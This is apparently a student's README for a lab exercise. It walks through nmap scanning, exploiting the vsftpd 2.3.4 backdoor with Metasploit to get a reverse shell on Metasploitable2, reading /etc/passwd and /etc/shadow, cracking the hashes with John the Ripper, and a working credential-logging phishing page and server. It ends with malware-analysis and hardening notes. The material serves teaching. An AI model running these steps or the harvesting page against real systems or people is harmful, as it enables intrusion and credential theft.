# ApexPlanet-Cybersecurity

# Task4: Exploitation & System Security 

**Scope:** This repository documents a controlled, lab-only exercise demonstrating reconnaissance, exploitation (vsftpd backdoor), post-exploitation password analysis, basic social engineering/phishing awareness, malware analysis (static + dynamic), and system hardening. All actions were performed on isolated VMs owned by the tester.

> **Warning / Legal:** Only run these steps in an isolated lab on machines you own or have written permission to test. Do not publish exploit payloads, real credentials, or live malware.

---

## 1) Lab setup

**VMs & network**

* Attacker: Kali Linux (snapshot before tests)
* Target: Metasploitable2 (snapshot before tests)
* Network type: Host-only (or internal) network to isolate from the internet

**Tools used (on attacker)**

* `msfconsole` (Metasploit)
* `nmap`, `netcat` (`nc`)
* `hydra`, `john` (John the Ripper)
* `tcpdump`, `wireshark`
* `vim`/`nano`, `scp`/`rsync`
* `wget`/`python` simple HTTP server for transfers
* Malware analysis: `strings`, `file`, `readelf`, `binwalk`, and offline sandbox VM (no internet)
* Demo phishing: a static HTML page hosted only inside the lab using `python3 -m http.server`

**Best practice before you start**

* Take snapshots of both VMs.
* Disable NAT/internet or use a segregated VLAN.
* Keep a lab notebook: commands, timestamps, and screenshots.

---

## 2) Recon & scanning

1. On Kali, find your IP and the target IP (example):

```bash
ifconfig  # or ip addr show
# attacker IP -> 192.168.56.102
# target IP  -> 192.168.56.101
```

2. Quick port/service discovery:

```bash
nmap -sC -sV -p- 192.168.56.102 -oA scans/full_scan
nmap -p 21,22,80,443,139,445 192.168.56.102 -oN scans/basic_ports.txt
```

3. Banner grab for FTP:

```bash
nc 192.168.56.102 21
# or
nmap -sV -p 21 192.168.56.102 -oN scans/vsftpd_banner.txt
```

Save all outputs under `scans/`.

---

## 3) Exploitation — vsftpd v2.3.4 backdoor (lab only)

> NOTE: only use the published Metasploit module against controlled lab VMs.

1. Start Metasploit on Kali:

```bash
msfconsole
```

2. Search and use the module:

```text
search name:vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
```

3. Verify options and available payloads:

```bash
show options
show payloads
```

4. Configure and run the exploit (replace IPs):

```bash
set RHOSTS 192.168.56.101
set RPORT 21
set LHOST 192.168.56.102
set LPORT 4444
set PAYLOAD cmd/unix/reverse  # or use recommended payload from show payloads
exploit
# or background
exploit -j
```

5. On success, interact with the session:

```bash
sessions -l
sessions -i <id>
# In the shell
whoami
id
uname -a
ifconfig -a  # or ip addr
ls -la
cat /etc/passwd
cat /etc/shadow   # only if you legitimately can (root) and in lab
```

6. Capture screenshots of the session, `sysinfo` output and key commands.

---

## 4) Post-exploitation & password cracking (offline)

### 4.1 Collecting files safely

* Copy `cat /etc/passwd` and `cat /etc/shadow` output from the remote shell into local files on Kali.
* Save as `passwd_copy.txt` and `shadow_copy.txt` under `analysis/`.

### 4.2 Prepare hashes for John

```bash
cd ~/lab/analysis
unshadow passwd_copy.txt shadow_copy.txt > hashes_unshadowed.txt
```

### 4.3 Prepare the wordlist

If `rockyou.txt.gz` exists, decompress it to a regular file:

```bash
mkdir -p ~/wordlists
zcat /usr/share/wordlists/rockyou.txt.gz > ~/wordlists/rockyou.txt
```

### 4.4 Run John the Ripper

* John detected `md5crypt` in this lab. Use the appropriate format if prompted.

```bash
john --format=md5crypt --wordlist=~/wordlists/rockyou.txt hashes_unshadowed.txt
```

* Monitor progress or run in background. When done:

```bash
john --show hashes_unshadowed.txt
```

### 4.5 Documenting results

* Redact actual passwords in public reports. Example: `msfadmin: <REDACTED - cracked>`.
* Note which accounts used weak passwords and which were not crackable (shadowed properly).

---

## 5) Phishing demo & awareness (lab-safe)

**Goal:** Demonstrate how a basic phishing page can capture credentials (lab-only) and cover awareness measures.

### 5.1 Build a harmless phishing page (do not collect real passwords)

Create `phish_demo/index.html` with a fake login form that does not send data to the internet — it will only log to a local file for demonstration.

Example `index.html` (save inside `phish_demo/`):

```html
<!doctype html>
<html>
<head><meta charset="utf-8"><title>Acme Corp - Login</title></head>
<body>
  <h1>Acme Corp Login</h1>
  <form method="POST" action="/submit">
    <label>Username: <input name="user"></label><br>
    <label>Password: <input name="pass" type="password"></label><br>
    <input type="submit" value="Login">
  </form>
  <p><em>Demo only. No credentials will be used outside this lab.</em></p>
</body>
</html>
```

### 5.2 Simple demo server that logs submissions (Kali only)

Create a tiny Python Flask or `http.server` script to log submissions to a local file (no network exfiltration). Example using Python's `http.server` (simple handler):

```python
# save as phish_demo/server.py
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/' or self.path.startswith('/index'):
            with open('phish_demo/index.html','rb') as f:
                self.send_response(200)
                self.send_header('Content-Type','text/html')
                self.end_headers()
                self.wfile.write(f.read())
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)
        params = urllib.parse.parse_qs(data.decode())
        with open('phish_demo/log.txt','a') as log:
            log.write(str(params) + '\n')
        # Respond with a friendly page
        self.send_response(200)
        self.send_header('Content-Type','text/html')
        self.end_headers()
        self.wfile.write(b"<html><body><h2>Thanks — demo only.</h2></body></html>")

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8000), Handler)
    print('Serving on http://0.0.0.0:8000')
    server.serve_forever()
```

Run:

```bash
python3 phish_demo/server.py
```

Open the page from a browser in the lab VM: `http://192.168.56.1:8000` and submit dummy credentials.

### 5.3 Awareness & mitigation notes (to include in README/report)

* Train users to inspect sender addresses and hover links before clicking.
* Use two-factor authentication (2FA) to reduce risk even if credentials are phished.
* Implement email filtering, DMARC/DKIM/SPF to reduce phishing delivery.
* Use browsers that warn about known phishing sites and consider enterprise URL filtering.
* Run phishing awareness campaigns and report metrics (click-through, report rates).

---

## 6) Malware analysis (static + dynamic)

**Goal:** Demonstrate safe static and dynamic analysis techniques in an isolated environment.

### 6.1 Prepare the environment

* Use a dedicated isolated VM (no internet) for dynamic runs; snapshot before running samples.
* Keep all analysis files offline and do not transfer samples to internet-connected machines.

### 6.2 Static analysis (no execution)

Common commands and their purpose:

```bash
file sample.bin        # determine file type
strings sample.bin | head -n 200     # readable strings
readelf -h sample.bin  # ELF header
objdump -d sample.bin  # disassembly (careful large)
binwalk sample.bin     # embedded files
hexdump -C sample.bin | head
```

**What to document:** suspicious API calls, C2 domain-like strings, embedded config, packer signatures, file metadata (compile time), and any obfuscation.

### 6.3 Dynamic analysis

Dynamic malware analysis = executing a suspicious sample in a **controlled, isolated environment** to observe its real-time behavior and produce actionable intelligence.

**Essentials**

* Run only in offline/sandbox VMs with snapshots to avoid spread.
* Observe runtime activity: processes, file I/O, persistence attempts, inter-process activity, and network traffic.
* Capture artifacts: memory dumps, process logs, file drops, and PCAPs.
* Produce IOCs (domains, IPs, file hashes, registry keys), behavioral summary, and detection guidance.
* Beware of anti-analysis techniques (VM checks, sleeps, packing); combine with static analysis.

**Outcome**

* Classify malware, extract IOCs, recommend containment/remediation, and provide detection rules.

---

## 7) System Hardening

System hardening = reducing attack surface and improving resilience by secure configuration, access control, and monitoring.

**Core practices**

* **Patch management:** apply updates promptly and prioritize critical fixes.
* **Remove/disable unused services & close unused ports.**
* **Least privilege & strong auth:** enforce MFA, avoid default/shared accounts, use RBAC.
* **Network segmentation:** isolate critical assets and limit lateral movement.
* **Endpoint protection & monitoring:** EDR/AV + centralized logging (SIEM) and alerts.
* **Backup & recovery:** maintain verified backups and tested restore procedures.
* **Configuration management & audits:** use baselines (CIS/NIST), automated checks, and regular validation.

**Goal**

* Make exploitation harder, speed detection, and simplify containment and recovery.

---

